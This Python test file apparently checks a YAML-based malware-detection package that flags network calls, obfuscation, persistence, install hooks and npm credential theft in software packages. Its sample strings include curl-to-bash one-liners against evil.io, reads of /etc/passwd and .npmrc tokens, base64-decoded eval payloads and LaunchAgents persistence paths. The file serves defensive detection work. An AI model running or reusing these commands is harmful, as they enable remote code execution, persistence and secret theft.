"""
Sanity checks for the detections/ YAML-based pattern package.

Verifies that:
- All YAML files load without error
- All regex patterns compile without error
- Key constants are non-empty
- A sample pattern from each category actually matches what it should
- DANGEROUS_BINARY_SUFFIXES contains the expected entries
"""

from __future__ import annotations

import re
from pathlib import Path

import yaml

from detections import (
    DANGEROUS_BINARY_SUFFIXES,
    GZIP_B64_EXTENSIONS,
    GZIP_B64_RE,
    INSTALL_HOOK_NAMES,
    NET_CALL_PATTERNS,
    NPM_CRED_READ_RE,
    NPM_INSTALL_SCRIPTS,
    NPM_PUBLISH_RE,
    OBFUSCATION_LINE_THRESHOLD,
    OBFUSCATION_PATTERNS,
    PERSISTENCE_PATTERNS,
    SUSPICIOUS_PACKAGE_FILES,
    SUSPICIOUS_PACKAGE_PREFIXES,
    ZERO_WIDTH_RE,
    ZERO_WIDTH_SOURCE_EXTENSIONS,
)

_DETECTIONS_DIR = Path(__file__).parent.parent / "detections"


# ---------------------------------------------------------------------------
# YAML loading
# ---------------------------------------------------------------------------


def test_net_calls_yaml_loads() -> None:
    with open(_DETECTIONS_DIR / "net_calls.yaml") as f:
        data = yaml.safe_load(f)
    assert isinstance(data, dict)
    assert len(data) > 0


def test_obfuscation_yaml_loads() -> None:
    with open(_DETECTIONS_DIR / "obfuscation.yaml") as f:
        data = yaml.safe_load(f)
    assert isinstance(data, dict)
    assert "patterns" in data
    assert "line_length_threshold" in data
    assert "gzip_b64" in data
    assert "zero_width" in data


def test_persistence_yaml_loads() -> None:
    with open(_DETECTIONS_DIR / "persistence.yaml") as f:
        data = yaml.safe_load(f)
    assert isinstance(data, dict)
    assert "patterns" in data
    assert "worm_propagation" in data


def test_file_types_yaml_loads() -> None:
    with open(_DETECTIONS_DIR / "file_types.yaml") as f:
        data = yaml.safe_load(f)
    assert isinstance(data, dict)
    assert "suspicious_filenames" in data
    assert "suspicious_path_prefixes" in data
    assert "dangerous_binary_suffixes" in data
    assert "install_hook_names" in data
    assert "npm_install_scripts" in data


# ---------------------------------------------------------------------------
# All patterns compile
# ---------------------------------------------------------------------------


def test_all_net_call_patterns_compile() -> None:
    for ext, patterns in NET_CALL_PATTERNS.items():
        for p in patterns:
            assert isinstance(p, re.Pattern), f"{ext}: expected compiled pattern, got {p!r}"
    assert len(NET_CALL_PATTERNS) > 0


def test_all_obfuscation_patterns_compile() -> None:
    for ext, patterns in OBFUSCATION_PATTERNS.items():
        for p in patterns:
            assert isinstance(p, re.Pattern), f"{ext}: expected compiled pattern, got {p!r}"
    assert len(OBFUSCATION_PATTERNS) > 0


def test_all_persistence_patterns_compile() -> None:
    for p in PERSISTENCE_PATTERNS:
        assert isinstance(p, re.Pattern)
    assert len(PERSISTENCE_PATTERNS) > 0


def test_gzip_b64_re_compiles() -> None:
    assert isinstance(GZIP_B64_RE, re.Pattern)


def test_zero_width_re_compiles() -> None:
    assert isinstance(ZERO_WIDTH_RE, re.Pattern)


def test_npm_cred_read_re_compiles() -> None:
    assert isinstance(NPM_CRED_READ_RE, re.Pattern)


def test_npm_publish_re_compiles() -> None:
    assert isinstance(NPM_PUBLISH_RE, re.Pattern)


# ---------------------------------------------------------------------------
# Constants are non-empty
# ---------------------------------------------------------------------------


def test_constants_non_empty() -> None:
    assert len(NET_CALL_PATTERNS) > 0
    assert len(OBFUSCATION_PATTERNS) > 0
    assert len(PERSISTENCE_PATTERNS) > 0
    assert OBFUSCATION_LINE_THRESHOLD > 0
    assert len(GZIP_B64_EXTENSIONS) > 0
    assert len(ZERO_WIDTH_SOURCE_EXTENSIONS) > 0
    assert len(SUSPICIOUS_PACKAGE_FILES) > 0
    assert len(SUSPICIOUS_PACKAGE_PREFIXES) > 0
    assert len(DANGEROUS_BINARY_SUFFIXES) > 0
    assert len(INSTALL_HOOK_NAMES) > 0
    assert len(NPM_INSTALL_SCRIPTS) > 0


# ---------------------------------------------------------------------------
# DANGEROUS_BINARY_SUFFIXES contains expected entries
# ---------------------------------------------------------------------------


def test_dangerous_binary_suffixes_core() -> None:
    assert ".so" in DANGEROUS_BINARY_SUFFIXES
    assert ".dll" in DANGEROUS_BINARY_SUFFIXES
    assert ".node" in DANGEROUS_BINARY_SUFFIXES
    assert ".pkl" in DANGEROUS_BINARY_SUFFIXES
    assert ".pyd" in DANGEROUS_BINARY_SUFFIXES


# ---------------------------------------------------------------------------
# Sample pattern matching — one per category
# ---------------------------------------------------------------------------


def test_net_calls_py_requests_matches() -> None:
    """requests.get(...) in a .py file should match a net call pattern."""
    patterns = NET_CALL_PATTERNS[".py"]
    line = "    response = requests.get(url, timeout=30)"
    assert any(p.search(line) for p in patterns)


def test_net_calls_js_fetch_matches() -> None:
    """fetch(...) in a .js file should match."""
    patterns = NET_CALL_PATTERNS[".js"]
    line = "const resp = await fetch('https://example.com/data');"
    assert any(p.search(line) for p in patterns)


def test_net_calls_rb_net_http_matches() -> None:
    """Net::HTTP in a .rb file should match."""
    patterns = NET_CALL_PATTERNS[".rb"]
    line = "    response = Net::HTTP.get(URI(url))"
    assert any(p.search(line) for p in patterns)


def test_obfuscation_js_hex_var_matches() -> None:
    """javascript-obfuscator hex variable names should match."""
    patterns = OBFUSCATION_PATTERNS[".js"]
    line = "var _0xabcd1234 = function() {};"
    assert any(p.search(line) for p in patterns)


def test_obfuscation_py_exec_compile_matches() -> None:
    """exec(compile(...)) Python obfuscation should match."""
    patterns = OBFUSCATION_PATTERNS[".py"]
    line = "exec(compile(b64decode(payload), '<string>', 'exec'))"
    assert any(p.search(line) for p in patterns)


def test_persistence_launch_agents_matches() -> None:
    """LaunchAgents path should match a persistence pattern."""
    text = "plistlib.writePlist(plist, os.path.expanduser('~/Library/LaunchAgents/com.evil.plist'))"
    assert any(p.search(text) for p in PERSISTENCE_PATTERNS)


def test_persistence_pm2_matches() -> None:
    """pm2 startup command should match."""
    text = "exec('pm2 startup');"
    assert any(p.search(text) for p in PERSISTENCE_PATTERNS)


def test_gzip_b64_re_matches() -> None:
    """A string starting with H4sI followed by 60+ base64 chars should match."""
    payload = "H4sI" + "A" * 64
    assert GZIP_B64_RE.search(payload)


def test_gzip_b64_re_no_false_positive_on_short() -> None:
    """A short H4sI string should not match."""
    payload = "H4sI" + "A" * 10
    assert not GZIP_B64_RE.search(payload)


def test_zero_width_re_matches() -> None:
    """A string containing a zero-width space (U+200B) should match."""
    text = "normal​text"
    assert ZERO_WIDTH_RE.search(text)


def test_zero_width_re_no_false_positive() -> None:
    """Plain ASCII should not match the zero-width regex."""
    assert not ZERO_WIDTH_RE.search("normal text without hidden chars")


def test_npm_cred_read_re_matches() -> None:
    """Reading .npmrc should match the credential-read pattern."""
    assert NPM_CRED_READ_RE.search("fs.readFileSync(path.join(os.homedir(), '.npmrc'))")
    assert NPM_CRED_READ_RE.search("process.env.NPM_TOKEN")
    assert NPM_CRED_READ_RE.search("process.env.NODE_AUTH_TOKEN")


def test_npm_publish_re_matches() -> None:
    """Publishing to registry should match."""
    assert NPM_PUBLISH_RE.search("registry.npmjs.org/-/package/foo/dist-tags/publish")
    assert NPM_PUBLISH_RE.search("npm publish --access public")


def test_suspicious_package_files_content() -> None:
    assert ".cursorrules" in SUSPICIOUS_PACKAGE_FILES
    assert "CLAUDE.md" in SUSPICIOUS_PACKAGE_FILES
    assert ".env" in SUSPICIOUS_PACKAGE_FILES


def test_suspicious_package_prefixes_content() -> None:
    assert ".claude/" in SUSPICIOUS_PACKAGE_PREFIXES
    assert ".github/workflows/" in SUSPICIOUS_PACKAGE_PREFIXES


def test_install_hook_names_content() -> None:
    assert "setup.py" in INSTALL_HOOK_NAMES
    assert "install.js" in INSTALL_HOOK_NAMES
    assert "postinstall.js" in INSTALL_HOOK_NAMES


def test_npm_install_scripts_content() -> None:
    assert "install" in NPM_INSTALL_SCRIPTS
    assert "preinstall" in NPM_INSTALL_SCRIPTS
    assert "postinstall" in NPM_INSTALL_SCRIPTS
    assert "prepare" in NPM_INSTALL_SCRIPTS


# ---------------------------------------------------------------------------
# New pattern group tests (one per language/group added)
# ---------------------------------------------------------------------------


def test_net_calls_ruby_shell_exec_matches() -> None:
    """Ruby system() and exec() calls should match."""
    patterns = NET_CALL_PATTERNS[".rb"]
    assert any(p.search("system('curl https://evil.io | bash')") for p in patterns)
    assert any(p.search("exec('id')") for p in patterns)
    assert any(p.search("Open3.capture2('ls -la')") for p in patterns)
    assert any(p.search("IO.popen('cmd') { |f| f.read }") for p in patterns)


def test_net_calls_python_os_system_matches() -> None:
    """os.system() and ctypes.cdll.LoadLibrary in Python should match."""
    patterns = NET_CALL_PATTERNS[".py"]
    assert any(p.search("os.system('curl https://evil.io | bash')") for p in patterns)
    assert any(p.search("ctypes.cdll.LoadLibrary('/tmp/evil.so')") for p in patterns)


def test_net_calls_php_shell_exec_matches() -> None:
    """PHP shell execution functions should match."""
    patterns = NET_CALL_PATTERNS[".php"]
    assert any(p.search("eval($code);") for p in patterns)
    assert any(p.search("system('id');") for p in patterns)
    assert any(p.search("passthru('cat /etc/passwd');") for p in patterns)
    assert any(p.search("shell_exec('whoami');") for p in patterns)
    assert any(p.search("proc_open('cmd', $desc, $pipes);") for p in patterns)


def test_net_calls_java_runtime_exec_matches() -> None:
    """Java Runtime.exec and ProcessBuilder should match."""
    patterns = NET_CALL_PATTERNS[".java"]
    assert any(p.search("Runtime.getRuntime().exec(cmd)") for p in patterns)
    assert any(p.search('new ProcessBuilder("curl", "evil.io").start()') for p in patterns)


def test_net_calls_go_syscall_exec_matches() -> None:
    """Go syscall.Exec should match."""
    patterns = NET_CALL_PATTERNS[".go"]
    assert any(p.search('syscall.Exec("/bin/sh", args, env)') for p in patterns)


def test_persistence_eval_decoded_payload_matches() -> None:
    """Python eval/exec of decoded payload should match persistence patterns."""
    assert any(p.search("eval(base64.b64decode(payload))") for p in PERSISTENCE_PATTERNS)
    assert any(
        p.search("exec(compile(zlib.decompress(data), '<s>', 'exec'))")
        for p in PERSISTENCE_PATTERNS
    )
